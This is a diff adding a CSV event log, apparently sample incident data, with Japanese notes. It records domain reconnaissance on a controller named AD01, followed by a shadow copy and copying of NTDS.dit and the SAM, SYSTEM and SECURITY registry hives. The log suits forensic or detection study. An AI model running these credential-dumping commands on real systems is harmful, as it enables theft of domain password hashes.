@@ -1,0 +1,10 @@
+timestamp,timezone,host,event_type,user,process,command_line,dst,dst_port,notes
+2025-05-10 03:06:12,JST,AD01,process,SAMPLE\Administrator,whoami.exe,"whoami /all",,,"内部探索: 実行ユーザーと権限確認"
+2025-05-10 03:07:44,JST,AD01,process,SAMPLE\Administrator,net.exe,"net group ""Domain Admins"" /domain",,,"内部探索: ドメイン管理者グループ確認"
+2025-05-10 03:09:18,JST,AD01,process,SAMPLE\Administrator,nltest.exe,"nltest /dclist:SAMPLE",,,"内部探索: ドメインコントローラー一覧確認"
+2025-05-10 03:11:03,JST,AD01,process,SAMPLE\Administrator,setspn.exe,"setspn -T SAMPLE -Q */*",,,"内部探索: SPN列挙"
+2025-05-10 03:18:02,JST,AD01,process,SAMPLE\Administrator,C:\Windows\System32\vssadmin.exe,"vssadmin create shadow /for=C:",,,"シャドウコピー作成"
+2025-05-10 03:25:19,JST,AD01,process,SAMPLE\Administrator,cmd.exe,"cmd.exe /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\NTDS.dit C:\ProgramData\Microsoft\ntds.dit",,,"NTDS.ditコピー試行"
+2025-05-10 03:25:48,JST,AD01,process,SAMPLE\Administrator,cmd.exe,"cmd.exe /c copy C:\Windows\System32\config\SYSTEM C:\ProgramData\Microsoft\SYSTEM",,,"SYSTEMハイブコピー試行"
+2025-05-10 03:25:49,JST,AD01,process,SAMPLE\Administrator,cmd.exe,"cmd.exe /c copy C:\Windows\System32\config\SAM C:\ProgramData\Microsoft\SAM",,,"SAMハイブコピー試行"
+2025-05-10 03:25:50,JST,AD01,process,SAMPLE\Administrator,cmd.exe,"cmd.exe /c copy C:\Windows\System32\config\SECURITY C:\ProgramData\Microsoft\SECURITY",,,"SECURITYハイブコピー試行"
